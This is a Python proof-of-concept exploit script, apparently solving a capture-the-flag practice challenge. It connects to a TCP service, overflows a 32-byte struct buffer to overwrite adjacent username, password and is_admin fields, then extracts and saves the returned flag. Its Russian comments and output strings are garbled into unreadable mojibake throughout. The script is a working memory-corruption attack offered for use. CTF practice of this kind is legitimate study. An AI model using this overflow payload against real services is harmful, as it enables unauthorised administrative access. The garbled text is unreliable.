#!/usr/bin/env python3
import socket
import struct
import sys

# –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è (–º–æ–∂–Ω–æ –∑–∞–¥–∞—Ç—å —á–µ—Ä–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏)
HOST = 'localhost'
PORT = 1337

def exploit(host=None, port=None):
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏–ª–∏ –∑–Ω–∞—á–µ–Ω–∏—è –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
    target_host = host or HOST
    target_port = port or PORT
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ –¥–ª—è Windows
    import os
    if os.name == 'nt':  # Windows
        try:
            import sys
            if sys.stdout.encoding != 'utf-8':
                import io
                sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
                sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
        except:
            pass
    
    print("=" * 60)
    print("POC –≠–∫—Å–ø–ª–æ–π—Ç –¥–ª—è Heap Overflow")
    print(f"–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ {target_host}:{target_port}")
    print("=" * 60)
    
    # –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target_host, target_port))
    except Exception as e:
        print(f"[!] –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")
        return
    
    # –ü–æ–ª—É—á–∞–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ
    welcome = s.recv(1024)
    print(f"[+] –ü–æ–ª—É—á–µ–Ω–æ: {welcome.decode('utf-8', errors='ignore').strip()}")
    
    # –°–æ–∑–¥–∞–µ–º payload –¥–ª—è Heap Overflow
    # –°—Ç—Ä—É–∫—Ç—É—Ä–∞ UserData –≤ –ø–∞–º—è—Ç–∏:
    #   - buffer[32]        ‚Üê –ù–∞—á–∞–ª–æ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã, –∑–¥–µ—Å—å –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ
    #   - username[32]      ‚Üê –°–º–µ—â–µ–Ω–∏–µ: 32 –±–∞–π—Ç–∞
    #   - password[32]      ‚Üê –°–º–µ—â–µ–Ω–∏–µ: 64 –±–∞–π—Ç–∞
    #   - is_admin (int, 4) ‚Üê –°–º–µ—â–µ–Ω–∏–µ: 96 –±–∞–π—Ç (—Ü–µ–ª—å!)
    #   - secret_flag[128]  ‚Üê –°–º–µ—â–µ–Ω–∏–µ: 100 –±–∞–π—Ç
    #
    # –ü—Ä–∏ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–∏ buffer –º—ã –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ–º –ø–æ–ª—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã:
    # –ù—É–∂–Ω–æ:
    # 1. –ó–∞–ø–æ–ª–Ω–∏—Ç—å buffer (32 –±–∞–π—Ç–∞)
    # 2. –ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å username (32 –±–∞–π—Ç–∞)
    # 3. –ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å password (32 –±–∞–π—Ç–∞)
    # 4. –ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å is_admin –Ω–∞ 1 (4 –±–∞–π—Ç–∞, little-endian)
    
    payload = b"A" * 32  # –ó–∞–ø–æ–ª–Ω—è–µ–º buffer
    payload += b"B" * 32  # –ü–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ–º username
    payload += b"C" * 32  # –ü–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ–º password
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º is_admin = 1 (4 –±–∞–π—Ç–∞, little-endian)
    # –í little-endian: 0x01 0x00 0x00 0x00
    # –¢–µ–ø–µ—Ä—å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è memcpy, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å null byte
    payload += struct.pack("<I", 1)  # 0x01 0x00 0x00 0x00
    
    print(f"\n[+] –°–æ–∑–¥–∞–Ω–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞: {len(payload)} –±–∞–π—Ç")
    print(f"[+] –†–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞: 32 –±–∞–π—Ç")
    print(f"[+] –ü–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ: {len(payload) - 32} –±–∞–π—Ç")
    print(f"[+] is_admin –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤: 1")
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —ç–∫—Å–ø–ª–æ–π—Ç
    print("\n[+] –û—Ç–ø—Ä–∞–≤–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞...")
    s.send(payload)
    
    # –ü–æ–ª—É—á–∞–µ–º –æ—Ç–≤–µ—Ç
    try:
        response = s.recv(4096)
        print(f"\n[+] –û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞ ({len(response)} –±–∞–π—Ç):")
        print("-" * 40)
        
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º
        text = response.decode('utf-8', errors='ignore')
        print(text)
        print("-" * 40)
        
        # –ò—â–µ–º —Ñ–ª–∞–≥
        if "practice{" in text:
            import re
            flag_match = re.search(r'practice\{[^}]+\}', text)
            if flag_match:
                print(f"\nüéâ üéâ üéâ –§–õ–ê–ì –ù–ê–ô–î–ï–ù! üéâ üéâ üéâ")
                print(f"–§–ª–∞–≥: {flag_match.group(0)}")
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
                with open("flag.txt", "w", encoding='utf-8') as f:
                    f.write(flag_match.group(0))
                print("–§–ª–∞–≥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ flag.txt")
            else:
                print("\n[!] practice{...} –Ω–∞–π–¥–µ–Ω–æ, –Ω–æ –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω–æ")
        elif "ADMIN ACCESS GRANTED" in text:
            print("\n[+] –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–π –¥–æ—Å—Ç—É–ø –ø–æ–ª—É—á–µ–Ω!")
            print("[!] –ù–æ —Ñ–ª–∞–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –æ—Ç–≤–µ—Ç–µ. –í–æ–∑–º–æ–∂–Ω–æ –Ω—É–∂–Ω–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è.")
        else:
            print("\n[!] –§–ª–∞–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –æ—Ç–≤–µ—Ç–µ")
            print("[!] –í–æ–∑–º–æ–∂–Ω–æ –Ω—É–∂–Ω–æ —Å–∫–æ—Ä—Ä–µ–∫—Ç–∏—Ä–æ–≤–∞—Ç—å payload –∏–ª–∏ —Ä–∞–∑–º–µ—Ä—ã —Å—Ç—Ä—É–∫—Ç—É—Ä")
            
    except Exception as e:
        print(f"\n[!] –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –æ—Ç–≤–µ—Ç–∞: {e}")
        print("–°–µ—Ä–≤–µ—Ä –≤–æ–∑–º–æ–∂–Ω–æ —É–ø–∞–ª")
    
    s.close()

if __name__ == "__main__":
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        try:
            port = int(sys.argv[2])
        except ValueError:
            print(f"–û—à–∏–±–∫–∞: –ø–æ—Ä—Ç –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º, –ø–æ–ª—É—á–µ–Ω–æ: {sys.argv[2]}")
            sys.exit(1)
        exploit(host, port)
    elif len(sys.argv) == 2:
        print("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: python exploit.py [HOST] [PORT]")
        print(f"–ü—Ä–∏–º–µ—Ä: python exploit.py localhost 1337")
        sys.exit(1)
    else:
        exploit()

